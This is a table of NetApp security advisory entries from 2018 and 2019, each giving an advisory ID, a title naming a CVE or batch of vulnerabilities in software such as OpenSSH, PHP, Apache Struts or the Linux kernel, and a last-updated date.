| [**NTAP-20190517-0003**](https://security.netapp.com/advisory/ntap-20190517-0003/) | CVE-2019-11036 PHP Vulnerability in NetApp Products | 2019-10-30 |
| [**NTAP-20190517-0001**](https://security.netapp.com/advisory/ntap-20190517-0001/) | CVE-2019-9636 Python Vulnerability in NetApp Products | 2020-03-27 |
| [**NTAP-20190517-0005**](https://security.netapp.com/advisory/ntap-20190517-0005/) | May 2019 Linux Kernel Vulnerabilities in NetApp Products | 2022-05-27 |
| [**NTAP-20190517-0004**](https://security.netapp.com/advisory/ntap-20190517-0004/) | May 2019 Wildfly Vulnerabilities in NetApp Products | 2019-06-12 |
| [**NTAP-20190517-0002**](https://security.netapp.com/advisory/ntap-20190517-0002/) | May 7th 2019 Linux Kernel Vulnerabilities in NetApp Products | 2022-05-27 |
| [**NTAP-20190516-0001**](https://security.netapp.com/advisory/ntap-20190516-0001/) | Intel SA-00223 UEFI Vulnerabilities in NetApp Products | 2019-05-21 |
| [**NTAP-20190515-0002**](https://security.netapp.com/advisory/ntap-20190515-0002/) | Intel SA-00213 Platform Firmware Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20190515-0001**](https://security.netapp.com/advisory/ntap-20190515-0001/) | Intel SA-00233 Processor Vulnerabilities in NetApp Products | 2022-01-14 |
| [**NTAP-20190514-0002**](https://security.netapp.com/advisory/ntap-20190514-0002/) | April 2019 ISC BIND Vulnerabilities in NetApp Products | 2019-05-14 |
| [**NTAP-20190514-0001**](https://security.netapp.com/advisory/ntap-20190514-0001/) | CVE-2018-16860 Samba Vulnerability in NetApp Products | 2019-05-14 |
| [**NTAP-20190510-0001**](https://security.netapp.com/advisory/ntap-20190510-0001/) | CVE-2019-5021 Alpine Linux Docker Image Vulnerability in NetApp Products | 2019-05-10 |
| [**NTAP-20190509-0003**](https://security.netapp.com/advisory/ntap-20190509-0003/) | April 2019 Eclipse Jetty Vulnerabilities in NetApp Products | 2021-06-08 |
| [**NTAP-20190509-0004**](https://security.netapp.com/advisory/ntap-20190509-0004/) | CVE-2019-4178 IBM Cognos Analytics Vulnerability in NetApp Products | 2019-08-09 |
| [**NTAP-20190509-0001**](https://security.netapp.com/advisory/ntap-20190509-0001/) | CVE-2019-5953 GNU Wget Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20190509-0002**](https://security.netapp.com/advisory/ntap-20190509-0002/) | May 2019 Kubernetes Vulnerabilities in NetApp Products | 2020-11-17 |
| [**NTAP-20190509-0005**](https://security.netapp.com/advisory/ntap-20190509-0005/) | Missing HTTP Security Headers in OnCommand Insight | 2019-05-09 |
| [**NTAP-20190509-0006**](https://security.netapp.com/advisory/ntap-20190509-0006/) | Missing HTTP Security Headers in OnCommand Unified Manager 7-Mode | 2019-05-09 |
| [**NTAP-20190509-0007**](https://security.netapp.com/advisory/ntap-20190509-0007/) | Missing HTTP Security Headers in OnCommand Unified Manager for VMware vSphere, Linux and Windows 7.3 and above | 2019-05-09 |
| [**NTAP-20190503-0001**](https://security.netapp.com/advisory/ntap-20190503-0001/) | CVE-2019-8936 Network Time Protocol Daemon (ntpd) Vulnerability in NetApp Products | 2019-05-03 |
| [**NTAP-20190502-0008**](https://security.netapp.com/advisory/ntap-20190502-0008/) | April 2019 Node.js Vulnerabilities in NetApp Products | 2019-05-02 |
| [**NTAP-20190502-0001**](https://security.netapp.com/advisory/ntap-20190502-0001/) | April 2019 PHP Vulnerabilities in NetApp Products | 2019-05-02 |
| [**NTAP-20190502-0004**](https://security.netapp.com/advisory/ntap-20190502-0004/) | April 2019 SQLite Vulnerabilities in NetApp Products | 2019-08-07 |
| [**NTAP-20190502-0009**](https://security.netapp.com/advisory/ntap-20190502-0009/) | CVE-2018-16984 Django Vulnerability in NetApp Products | 2020-09-01 |
| [**NTAP-20190502-0002**](https://security.netapp.com/advisory/ntap-20190502-0002/) | CVE-2018-20449 Linux Kernel Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20190502-0006**](https://security.netapp.com/advisory/ntap-20190502-0006/) | CVE-2019-0222 Apache ActiveMQ Vulnerability in NetApp Products | 2019-10-16 |
| [**NTAP-20190502-0005**](https://security.netapp.com/advisory/ntap-20190502-0005/) | CVE-2019-3836 GnuTLS Vulnerability in NetApp Products | 2019-05-02 |
| [**NTAP-20190502-0003**](https://security.netapp.com/advisory/ntap-20190502-0003/) | CVE-2019-9193 PostgreSQL in NetApp Products | 2019-05-06 |
| [**NTAP-20190502-0007**](https://security.netapp.com/advisory/ntap-20190502-0007/) | March 2019 PHP Vulnerabilities in NetApp Products | 2019-05-02 |
| [**NTAP-20190426-0001**](https://security.netapp.com/advisory/ntap-20190426-0001/) | CVE-2019-5492 Sensitive Information Disclosure Vulnerability in Element Plug-in for vCenter Server | 2019-04-26 |
| [**NTAP-20190423-0001**](https://security.netapp.com/advisory/ntap-20190423-0001/) | April 2019 Apache HTTP Server Vulnerabilities in NetApp Products | 2020-06-18 |
| [**NTAP-20190423-0003**](https://security.netapp.com/advisory/ntap-20190423-0003/) | April 2019 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2021-01-05 |
| [**NTAP-20190423-0002**](https://security.netapp.com/advisory/ntap-20190423-0002/) | April 2019 MySQL Vulnerabilities in NetApp Products | 2021-01-18 |
| [**NTAP-20190419-0001**](https://security.netapp.com/advisory/ntap-20190419-0001/) | April 2019 Apache Tomcat Vulnerabilities in NetApp Products | 2019-04-26 |
| [**NTAP-20190416-0002**](https://security.netapp.com/advisory/ntap-20190416-0002/) | April 2019 Kubernetes Vulnerabilities in NetApp Products | 2020-11-17 |
| [**NTAP-20190416-0008**](https://security.netapp.com/advisory/ntap-20190416-0008/) | CVE-2018-1002101 Kubernetes Vulnerability in NetApp Products | 2020-11-17 |
| [**NTAP-20190416-0001**](https://security.netapp.com/advisory/ntap-20190416-0001/) | CVE-2018-1002105 Kubernetes Privilege Escalation Vulnerability in NetApp Products | 2020-11-17 |
| [**NTAP-20190416-0009**](https://security.netapp.com/advisory/ntap-20190416-0009/) | CVE-2018-11767 Apache Hadoop Vulnerability in NetApp Products | 2019-04-16 |
| [**NTAP-20190416-0003**](https://security.netapp.com/advisory/ntap-20190416-0003/) | CVE-2018-18955 Linux Kernel Vulnerability in NetApp Products | 2019-07-31 |
| [**NTAP-20190416-0006**](https://security.netapp.com/advisory/ntap-20190416-0006/) | CVE-2018-20217 MIT Kerberos 5 Vulnerability in NetApp Products | 2019-04-16 |
| [**NTAP-20190416-0010**](https://security.netapp.com/advisory/ntap-20190416-0010/) | CVE-2018-20406 Python Vulnerability in NetApp Products | 2019-04-16 |
| [**NTAP-20190416-0004**](https://security.netapp.com/advisory/ntap-20190416-0004/) | December 2018 Grafana Vulnerabilities in NetApp Products | 2020-03-27 |
| [**NTAP-20190416-0005**](https://security.netapp.com/advisory/ntap-20190416-0005/) | March 2019 SQLite Vulnerabilities in NetApp Products | 2019-04-16 |
| [**NTAP-20190416-0007**](https://security.netapp.com/advisory/ntap-20190416-0007/) | September 2018 jQuery Vulnerabilities in NetApp Products | 2024-01-02 |
| [**NTAP-20190411-0003**](https://security.netapp.com/advisory/ntap-20190411-0003/) | April 2019 Linux Kernel Vulnerabilities in NetApp Products | 2020-05-22 |
| [**NTAP-20190411-0004**](https://security.netapp.com/advisory/ntap-20190411-0004/) | CVE-2019-3880 Samba Vulnerability in NetApp Products | 2019-04-11 |
| [**NTAP-20190411-0002**](https://security.netapp.com/advisory/ntap-20190411-0002/) | CVE-2019-7612 Logstash Vulnerability in NetApp Products | 2020-03-27 |
| [**NTAP-20190411-0001**](https://security.netapp.com/advisory/ntap-20190411-0001/) | CVE-2019-9924 GNU Bash Vulnerability in NetApp Products | 2020-05-22 |
| [**NTAP-20190411-0005**](https://security.netapp.com/advisory/ntap-20190411-0005/) | January 2019 Brocade Network Advisor Vulnerabilities in NetApp Products | 2019-04-11 |
| [**NTAP-20190411-0006**](https://security.netapp.com/advisory/ntap-20190411-0006/) | March 2019 QEMU Vulnerabilities in NetApp Products | 2019-04-11 |
| [**NTAP-20190408-0001**](https://security.netapp.com/advisory/ntap-20190408-0001/) | CVE-2019-3870 Samba Vulnerability in NetApp Products | 2019-04-08 |
| [**NTAP-20190404-0003**](https://security.netapp.com/advisory/ntap-20190404-0003/) | February 2018 GNU C Library Vulnerabilities in NetApp Products | 2022-07-01 |
| [**NTAP-20190404-0001**](https://security.netapp.com/advisory/ntap-20190404-0001/) | March 2019 PuTTY Vulnerabilities in NetApp Products | 2019-05-21 |
| [**NTAP-20190404-0004**](https://security.netapp.com/advisory/ntap-20190404-0004/) | March 2019 Python Vulnerabilities in NetApp Products | 2020-03-27 |
| [**NTAP-20190404-0002**](https://security.netapp.com/advisory/ntap-20190404-0002/) | March 27th 2019 Linux Kernel Vulnerabilities in NetApp Products | 2020-05-22 |
| [**NTAP-20190401-0002**](https://security.netapp.com/advisory/ntap-20190401-0002/) | CVE-2019-9898 PuTTY Vulnerability in NetApp Products | 2020-04-13 |
| [**NTAP-20190401-0003**](https://security.netapp.com/advisory/ntap-20190401-0003/) | December 2018 IBM Cognos Analytics Vulnerabilities in NetApp Products | 2019-04-01 |
| [**NTAP-20190401-0001**](https://security.netapp.com/advisory/ntap-20190401-0001/) | May 2018 GNU C Library Vulnerabilities in NetApp Products | 2022-07-01 |
| [**NTAP-20190327-0003**](https://security.netapp.com/advisory/ntap-20190327-0003/) | CVE-2017-3164 Apache Solr Vulnerability in NetApp Products | 2019-03-27 |
| [**NTAP-20190327-0004**](https://security.netapp.com/advisory/ntap-20190327-0004/) | CVE-2019-6454 systemd Vulnerability in NetApp Products | 2020-03-27 |
| [**NTAP-20190327-0001**](https://security.netapp.com/advisory/ntap-20190327-0001/) | Intel SA-00112 Active Management Technology Vulnerabilities in NetApp Products | 2019-03-27 |
| [**NTAP-20190327-0006**](https://security.netapp.com/advisory/ntap-20190327-0006/) | Intel SA-00118 Converged Security Management Engine Vulnerability in NetApp Products | 2019-03-27 |
| [**NTAP-20190327-0005**](https://security.netapp.com/advisory/ntap-20190327-0005/) | March 2019 Libssh2 Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20190327-0002**](https://security.netapp.com/advisory/ntap-20190327-0002/) | March 2019 Linux Kernel Vulnerabilities in NetApp Products | 2020-10-07 |
| [**NTAP-20190327-0007**](https://security.netapp.com/advisory/ntap-20190327-0007/) | October 2018 GNU Binutils Vulnerabilities in NetApp Products | 2019-10-01 |
| [**NTAP-20190321-0003**](https://security.netapp.com/advisory/ntap-20190321-0003/) | CVE-2018-19591 GNU C Library (glibc) Vulnerability in NetApp Products | 2022-07-01 |
| [**NTAP-20190321-0002**](https://security.netapp.com/advisory/ntap-20190321-0002/) | CVE-2018-20483 GNU Wget Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20190321-0001**](https://security.netapp.com/advisory/ntap-20190321-0001/) | February 2019 PHP Vulnerabilities in NetApp Products | 2019-03-21 |
| [**NTAP-20190318-0001**](https://security.netapp.com/advisory/ntap-20190318-0001/) | Intel SA-00185 CSME-SPS-TXE-AMT Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20190318-0002**](https://security.netapp.com/advisory/ntap-20190318-0002/) | Intel SA-00191 Firmware Vulnerabilities in NetApp Products | 2020-09-24 |
| [**NTAP-20190315-0003**](https://security.netapp.com/advisory/ntap-20190315-0003/) | CVE-2019-6977 PHP Vulnerability in NetApp Products | 2019-03-15 |
| [**NTAP-20190315-0001**](https://security.netapp.com/advisory/ntap-20190315-0001/) | February 2019 curl/libcurl Vulnerabilities in NetApp Products | 2019-07-16 |
| [**NTAP-20190315-0002**](https://security.netapp.com/advisory/ntap-20190315-0002/) | March 2019 GNU C Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20190314-0002**](https://security.netapp.com/advisory/ntap-20190314-0002/) | CVE-2019-1543 OpenSSL Vulnerability in NetApp Products | 2021-04-09 |
| [**NTAP-20190314-0001**](https://security.netapp.com/advisory/ntap-20190314-0001/) | CVE-2019-6260 ASPEED BMC Vulnerability in NetApp Products | 2021-11-01 |
| [**NTAP-20190314-0003**](https://security.netapp.com/advisory/ntap-20190314-0003/) | February 2019 GNU Binutils Vulnerabilities in NetApp Products | 2022-05-27 |
| [**NTAP-20190307-0004**](https://security.netapp.com/advisory/ntap-20190307-0004/) | CVE-2011-4461 Eclipse Jetty Vulnerability in NetApp Products | 2021-01-04 |
| [**NTAP-20190307-0005**](https://security.netapp.com/advisory/ntap-20190307-0005/) | CVE-2015-2080 Eclipse Jetty Vulnerability in NetApp Products | 2021-01-04 |
| [**NTAP-20190307-0006**](https://security.netapp.com/advisory/ntap-20190307-0006/) | CVE-2016-4800 Eclipse Jetty Vulnerability in NetApp Products | 2021-01-04 |
| [**NTAP-20190307-0007**](https://security.netapp.com/advisory/ntap-20190307-0007/) | CVE-2018-16888 Systemd Vulnerability in NetApp Products | 2020-08-18 |
| [**NTAP-20190307-0002**](https://security.netapp.com/advisory/ntap-20190307-0002/) | CVE-2018-8026 Apache Solr Vulnerability in NetApp Products | 2019-03-08 |
| [**NTAP-20190307-0001**](https://security.netapp.com/advisory/ntap-20190307-0001/) | CVE-2019-5489 Linux Kernel Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20190307-0008**](https://security.netapp.com/advisory/ntap-20190307-0008/) | CVE-2019-5736 Opencontainers-runc Vulnerability in NetApp Products | 2020-10-07 |
| [**NTAP-20190307-0003**](https://security.netapp.com/advisory/ntap-20190307-0003/) | November 2018 GNU Binutils Vulnerabilities in NetApp Products | 2019-09-20 |
| [**NTAP-20190305-0001**](https://security.netapp.com/advisory/ntap-20190305-0001/) | CVE-2019-5490 Default Privileged Account Vulnerability in the NetApp Service Processor | 2019-04-11 |
| [**NTAP-20190304-0002**](https://security.netapp.com/advisory/ntap-20190304-0002/) | CVE-2017-15515 Cross-Site Scripting Vulnerability in SnapCenter Server | 2019-03-04 |
| [**NTAP-20190304-0001**](https://security.netapp.com/advisory/ntap-20190304-0001/) | CVE-2018-5482 Secure Cookie Attribute Vulnerability in SnapCenter Server | 2019-03-04 |
| [**NTAP-20190301-0001**](https://security.netapp.com/advisory/ntap-20190301-0001/) | CVE-2019-1559 OpenSSL Vulnerability in NetApp Products | 2024-01-02 |
| [**NTAP-20190227-0001**](https://security.netapp.com/advisory/ntap-20190227-0001/) | CVE-2019-5491 SMB Information Disclosure Vulnerability in Clustered Data ONTAP 9.0 and higher | 2019-02-27 |
| [**NTAP-20190226-0001**](https://security.netapp.com/advisory/ntap-20190226-0001/) | CVE-2019-3824 Samba Vulnerability in NetApp Products | 2019-02-26 |
| [**NTAP-20190221-0001**](https://security.netapp.com/advisory/ntap-20190221-0001/) | CVE-2018-1000656 Flask Vulnerability in NetApp Products | 2020-03-27 |
| [**NTAP-20190221-0004**](https://security.netapp.com/advisory/ntap-20190221-0004/) | December 2018 GNU Binutils Vulnerabilities in NetApp Products | 2022-08-26 |
| [**NTAP-20190221-0003**](https://security.netapp.com/advisory/ntap-20190221-0003/) | December 2018 PERL Vulnerabilities in NetApp Products | 2021-04-26 |
| [**NTAP-20190221-0002**](https://security.netapp.com/advisory/ntap-20190221-0002/) | November 2018 Ruby Vulnerabilities in NetApp Products | 2019-02-28 |
| [**NTAP-20190215-0001**](https://security.netapp.com/advisory/ntap-20190215-0001/) | CVE-2018-20685 OpenSSH Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20190213-0001**](https://security.netapp.com/advisory/ntap-20190213-0001/) | January 2019 OpenSSH Vulnerabilities in NetApp Products | 2024-06-14 |
| [**NTAP-20190212-0001**](https://security.netapp.com/advisory/ntap-20190212-0001/) | November 2017 Apache Commons FileUpload Vulnerabilities in NetApp Products | 2019-08-20 |
| [**NTAP-20190206-0001**](https://security.netapp.com/advisory/ntap-20190206-0001/) | CVE-2016-6210 OpenSSH Vulnerability in NetApp Products | 2020-11-19 |
| [**NTAP-20190204-0004**](https://security.netapp.com/advisory/ntap-20190204-0004/) | CVE-2018-11763 Apache HTTP Server Vulnerability in NetApp Products | 2019-10-11 |
| [**NTAP-20190204-0002**](https://security.netapp.com/advisory/ntap-20190204-0002/) | CVE-2018-14634 Linux Kernel Integer Overflow Vulnerability in NetApp Products | 2020-05-15 |
| [**NTAP-20190204-0003**](https://security.netapp.com/advisory/ntap-20190204-0003/) | September 2018 Bouncy Castle Vulnerabilities in NetApp Products | 2020-11-24 |
| [**NTAP-20190204-0001**](https://security.netapp.com/advisory/ntap-20190204-0001/) | September 2018 Linux Kernel Vulnerabilities in NetApp Products | 2020-05-22 |
| [**NTAP-20190125-0003**](https://security.netapp.com/advisory/ntap-20190125-0003/) | CVE-2018-5499 Denial of Service Vulnerability in ATTO FibreBridge 7500N | 2019-02-12 |
| [**NTAP-20190125-0002**](https://security.netapp.com/advisory/ntap-20190125-0002/) | CVE-2019-3462 APT Vulnerability in NetApp Products | 2020-03-27 |
| [**NTAP-20190125-0001**](https://security.netapp.com/advisory/ntap-20190125-0001/) | January 2019 Apache HTTP Server Vulnerabilities in NetApp Products | 2019-07-30 |
| [**NTAP-20190118-0001**](https://security.netapp.com/advisory/ntap-20190118-0001/) | January 2019 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2021-01-05 |
| [**NTAP-20190118-0002**](https://security.netapp.com/advisory/ntap-20190118-0002/) | January 2019 MySQL Vulnerabilities in NetApp Products | 2021-01-28 |
| [**NTAP-20190117-0001**](https://security.netapp.com/advisory/ntap-20190117-0001/) | January 2019 Systemd-journald Vulnerabilities in NetApp Products | 2020-05-22 |
| [**NTAP-20190115-0001**](https://security.netapp.com/advisory/ntap-20190115-0001/) | CVE-2018-5498 Denial of Service Vulnerability in Clustered Data ONTAP 9.0 and higher | 2019-01-15 |
| [**NTAP-20190109-0001**](https://security.netapp.com/advisory/ntap-20190109-0001/) | CVE-2018-5497 Sensitive Information Disclosure Vulnerability in Clustered Data ONTAP 9.x | 2019-01-09 |
| [**NTAP-20190104-0001**](https://security.netapp.com/advisory/ntap-20190104-0001/) | CVE-2018-5481 Secure Cookie Attribute Vulnerability in OnCommand Unified Manager for 7-Mode (core package) | 2019-01-04 |
| [**NTAP-20181221-0006**](https://security.netapp.com/advisory/ntap-20181221-0006/) | CVE-2007-6750 Apache HTTP Server Vulnerability in NetApp Products | 2018-12-21 |
| [**NTAP-20181221-0002**](https://security.netapp.com/advisory/ntap-20181221-0002/) | CVE-2018-14627 Wildfly Vulnerability in NetApp Products | 2018-12-21 |
| [**NTAP-20181221-0001**](https://security.netapp.com/advisory/ntap-20181221-0001/) | CVE-2018-15919 OpenSSH Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20181221-0004**](https://security.netapp.com/advisory/ntap-20181221-0004/) | CVE-2018-19518 PHP Vulnerability in NetApp Products | 2018-12-21 |
| [**NTAP-20181221-0003**](https://security.netapp.com/advisory/ntap-20181221-0003/) | CVE-2018-19935 PHP Vulnerability in NetApp Products | 2019-10-11 |
| [**NTAP-20181221-0005**](https://security.netapp.com/advisory/ntap-20181221-0005/) | November 2018 PHP Vulnerabilities in NetApp Products | 2019-01-23 |
| [**NTAP-20181204-0001**](https://security.netapp.com/advisory/ntap-20181204-0001/) | CVE-2018-5496 Sensitive Information Disclosure Vulnerability in Data ONTAP operating in 7-Mode | 2018-12-04 |
| [**NTAP-20181127-0002**](https://security.netapp.com/advisory/ntap-20181127-0002/) | CVE-2016-7076 sudo Vulnerability in NetApp Products | 2018-11-29 |
| [**NTAP-20181127-0003**](https://security.netapp.com/advisory/ntap-20181127-0003/) | CVE-2017-7660 Apache Solr Vulnerability in NetApp Products | 2018-11-27 |
| [**NTAP-20181127-0004**](https://security.netapp.com/advisory/ntap-20181127-0004/) | June 2018 Bouncy Castle Vulnerabilities in NetApp Products | 2020-12-08 |
| [**NTAP-20181127-0001**](https://security.netapp.com/advisory/ntap-20181127-0001/) | November 2018 Samba Vulnerabilities in NetApp StorageGRID Products | 2018-11-27 |
| [**NTAP-20181126-0001**](https://security.netapp.com/advisory/ntap-20181126-0001/) | CVE-2018-5407 Simultaneous Multithreading Side-Channel Information Disclosure Vulnerability in NetApp Products | 2019-04-11 |
| [**NTAP-20181123-0001**](https://security.netapp.com/advisory/ntap-20181123-0001/) | CVE-2017-16642 PHP Vulnerability in NetApp Products | 2019-03-14 |
| [**NTAP-20181114-0001**](https://security.netapp.com/advisory/ntap-20181114-0001/) | CVE-2018-5495 Remote Code Execution Vulnerability in StorageGRID Webscale | 2018-11-14 |
| [**NTAP-20181112-0001**](https://security.netapp.com/advisory/ntap-20181112-0001/) | Self-Encrypting Solid State Drive Vulnerabilities in NetApp Products | 2020-11-18 |
| [**NTAP-20181109-0001**](https://security.netapp.com/advisory/ntap-20181109-0001/) | CVE-2018-12882 PHP Vulnerability in NetApp Products | 2019-03-08 |
| [**NTAP-20181107-0003**](https://security.netapp.com/advisory/ntap-20181107-0003/) | August 2018 PHP Vulnerabilities in NetApp Products | 2019-03-08 |
| [**NTAP-20181107-0002**](https://security.netapp.com/advisory/ntap-20181107-0002/) | CVE-2017-5645 Apache Log4j Vulnerability in NetApp Products | 2020-11-24 |
| [**NTAP-20181107-0001**](https://security.netapp.com/advisory/ntap-20181107-0001/) | October 2018 Net-SNMP Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20181105-0001**](https://security.netapp.com/advisory/ntap-20181105-0001/) | CVE-2018-0732 OpenSSL Vulnerability in NetApp Products | 2024-01-02 |
| [**NTAP-20181105-0002**](https://security.netapp.com/advisory/ntap-20181105-0002/) | October 2018 OpenSSL Vulnerabilities in NetApp Products | 2024-01-02 |
| [**NTAP-20181101-0001**](https://security.netapp.com/advisory/ntap-20181101-0001/) | CVE-2018-15473 OpenSSH Username Enumeration Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20181023-0001**](https://security.netapp.com/advisory/ntap-20181023-0001/) | CVE-2015-5352 OpenSSH Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20181018-0001**](https://security.netapp.com/advisory/ntap-20181018-0001/) | October 2018 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2021-01-05 |
| [**NTAP-20181018-0002**](https://security.netapp.com/advisory/ntap-20181018-0002/) | October 2018 MySQL Vulnerabilities in NetApp Products | 2021-01-18 |
| [**NTAP-20181016-0001**](https://security.netapp.com/advisory/ntap-20181016-0001/) | CVE-2018-3665 Lazy FPU State Restore Information Disclosure Vulnerability in NetApp Products | 2021-04-26 |
| [**NTAP-20181014-0002**](https://security.netapp.com/advisory/ntap-20181014-0002/) | CVE-2018-11784 Apache Tomcat Open Redirect Vulnerability in NetApp Products | 2019-04-12 |
| [**NTAP-20181014-0001**](https://security.netapp.com/advisory/ntap-20181014-0001/) | September 2018 Eclipse Jetty Vulnerabilities in NetApp Products | 2021-01-04 |
| [**NTAP-20181003-0002**](https://security.netapp.com/advisory/ntap-20181003-0002/) | CVE-2018-5391 Linux Kernel Denial of Service Vulnerability in NetApp Products | 2022-01-14 |
| [**NTAP-20181003-0001**](https://security.netapp.com/advisory/ntap-20181003-0001/) | CVE-2018-5492 Unauthenticated Remote Code Execution Vulnerability in E-Series SANtricity OS Controller Software 11.30.5 | 2018-10-03 |
| [**NTAP-20180927-0001**](https://security.netapp.com/advisory/ntap-20180927-0001/) | CVE-2018-12015 Perl Vulnerability in NetApp Products | 2020-01-09 |
| [**NTAP-20180927-0002**](https://security.netapp.com/advisory/ntap-20180927-0002/) | CVE-2018-8897 x86 Debug Exception Vulnerability in NetApp Products | 2022-06-14 |
| [**NTAP-20180926-0002**](https://security.netapp.com/advisory/ntap-20180926-0002/) | CVE-2016-2848 ISC BIND Vulnerability in NetApp Products | 2019-02-07 |
| [**NTAP-20180926-0006**](https://security.netapp.com/advisory/ntap-20180926-0006/) | CVE-2016-4975 Apache HTTP Server Vulnerability in NetApp Products | 2019-03-08 |
| [**NTAP-20180926-0003**](https://security.netapp.com/advisory/ntap-20180926-0003/) | CVE-2018-5740 ISC Bind Vulnerability in NetApp Products | 2020-09-01 |
| [**NTAP-20180926-0005**](https://security.netapp.com/advisory/ntap-20180926-0005/) | February 2018 ISC BIND Vulnerabilities in NetApp Products | 2020-09-01 |
| [**NTAP-20180926-0007**](https://security.netapp.com/advisory/ntap-20180926-0007/) | July 2018 Apache HTTP Server Vulnerabilities in NetApp Products | 2019-03-08 |
| [**NTAP-20180926-0001**](https://security.netapp.com/advisory/ntap-20180926-0001/) | June 2017 ISC BIND Vulnerabilities in NetApp Products | 2018-12-11 |
| [**NTAP-20180926-0004**](https://security.netapp.com/advisory/ntap-20180926-0004/) | May 2018 ISC BIND Vulnerabilities in NetApp Products | 2019-07-10 |
| [**NTAP-20180924-0004**](https://security.netapp.com/advisory/ntap-20180924-0004/) | CVE-2017-5703 Intel SPI Flash Denial of Service Vulnerability in NetApp Products | 2019-11-19 |
| [**NTAP-20180924-0001**](https://security.netapp.com/advisory/ntap-20180924-0001/) | CVE-2018-17082 PHP Vulnerability in NetApp Products | 2019-03-08 |
| [**NTAP-20180924-0002**](https://security.netapp.com/advisory/ntap-20180924-0002/) | CVE-2018-3643 Intel Processor Power Management Controller Vulnerability in NetApp Products | 2020-04-23 |
| [**NTAP-20180924-0003**](https://security.netapp.com/advisory/ntap-20180924-0003/) | September 2018 Intel Converged Security Management Engine Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20180823-0001**](https://security.netapp.com/advisory/ntap-20180823-0001/) | CVE-2018-3693 Processor Speculative Execution Branch Prediction Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20180822-0001**](https://security.netapp.com/advisory/ntap-20180822-0001/) | CVE-2018-11776 Apache Struts Vulnerability in NetApp Products | 2018-08-24 |
| [**NTAP-20180817-0001**](https://security.netapp.com/advisory/ntap-20180817-0001/) | July 2018 Apache Tomcat Vulnerabilities in NetApp Products | 2019-03-04 |
| [**NTAP-20180815-0003**](https://security.netapp.com/advisory/ntap-20180815-0003/) | CVE-2018-5390 Linux Kernel Denial of Service (DoS) Vulnerability in NetApp Products | 2021-10-19 |
| [**NTAP-20180815-0002**](https://security.netapp.com/advisory/ntap-20180815-0002/) | CVE-2018-6922 FreeBSD Denial of Service (DoS) Vulnerability in NetApp Products | 2018-11-09 |
| [**NTAP-20180815-0001**](https://security.netapp.com/advisory/ntap-20180815-0001/) | Intel SA-00161 L1 Terminal Fault Vulnerabilities in NetApp Products | 2018-09-26 |
| [**NTAP-20180814-0001**](https://security.netapp.com/advisory/ntap-20180814-0001/) | August 2018 Samba Vulnerabilities in NetApp Products | 2018-08-14 |
| [**NTAP-20180802-0002**](https://security.netapp.com/advisory/ntap-20180802-0002/) | April 2017 ISC BIND Vulnerabilities in NetApp Products | 2018-12-11 |
| [**NTAP-20180802-0001**](https://security.netapp.com/advisory/ntap-20180802-0001/) | CVE-2018-3652 Intel Processor Information Disclosure and Privilege Escalation Vulnerability in NetApp Products | 2019-02-21 |
| [**NTAP-20180731-0003**](https://security.netapp.com/advisory/ntap-20180731-0003/) | CVE-2015-5146 Network Time Protocol Daemon (ntpd) Denial of Service Vulnerability in NetApp Products | 2019-01-30 |
| [**NTAP-20180731-0001**](https://security.netapp.com/advisory/ntap-20180731-0001/) | CVE-2017-13652 Clickjacking Vulnerability in OnCommand Insight | 2018-07-31 |
| [**NTAP-20180731-0002**](https://security.netapp.com/advisory/ntap-20180731-0002/) | November 2017 Apache Tomcat Vulnerabilities in NetApp Products | 2018-07-31 |
| [**NTAP-20180726-0003**](https://security.netapp.com/advisory/ntap-20180726-0003/) | CVE-2018-0737 OpenSSL Vulnerability in NetApp Products | 2024-01-02 |
| [**NTAP-20180726-0001**](https://security.netapp.com/advisory/ntap-20180726-0001/) | July 2018 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2021-10-19 |
| [**NTAP-20180726-0002**](https://security.netapp.com/advisory/ntap-20180726-0002/) | July 2018 MySQL Vulnerabilities in NetApp Products | 2021-01-18 |
| [**NTAP-20180706-0001**](https://security.netapp.com/advisory/ntap-20180706-0001/) | February 2018 Apache Tomcat Vulnerabilities in NetApp Products | 2018-07-06 |
| [**NTAP-20180706-0002**](https://security.netapp.com/advisory/ntap-20180706-0002/) | July 2017 Apache Struts Vulnerabilities in NetApp Products | 2018-07-06 |
| [**NTAP-20180629-0006**](https://security.netapp.com/advisory/ntap-20180629-0006/) | April 2018 Apache Struts Vulnerabilities in NetApp Products | 2018-06-29 |
| [**NTAP-20180629-0002**](https://security.netapp.com/advisory/ntap-20180629-0002/) | CVE-2015-5209 Apache Struts Vulnerability in NetApp Products | 2018-06-29 |
| [**NTAP-20180629-0005**](https://security.netapp.com/advisory/ntap-20180629-0005/) | CVE-2016-3090 Apache Struts Vulnerability in NetApp Products | 2018-06-29 |
| [**NTAP-20180629-0004**](https://security.netapp.com/advisory/ntap-20180629-0004/) | CVE-2016-4461 Apache Struts Vulnerability in NetApp Products | 2018-06-29 |
| [**NTAP-20180629-0003**](https://security.netapp.com/advisory/ntap-20180629-0003/) | October 2017 Apache Struts Vulnerabilities in NetApp Products | 2018-06-29 |
| [**NTAP-20180629-0001**](https://security.netapp.com/advisory/ntap-20180629-0001/) | September 2017 Apache Struts Vulnerabilities in NetApp Products | 2018-06-29 |
| [**NTAP-20180628-0001**](https://security.netapp.com/advisory/ntap-20180628-0001/) | CVE-2015-8325 OpenSSH Vulnerability in NetApp Products | 2018-11-12 |
| [**NTAP-20180626-0002**](https://security.netapp.com/advisory/ntap-20180626-0002/) | CVE-2015-8960 TLS Vulnerability in NetApp Products | 2021-03-16 |
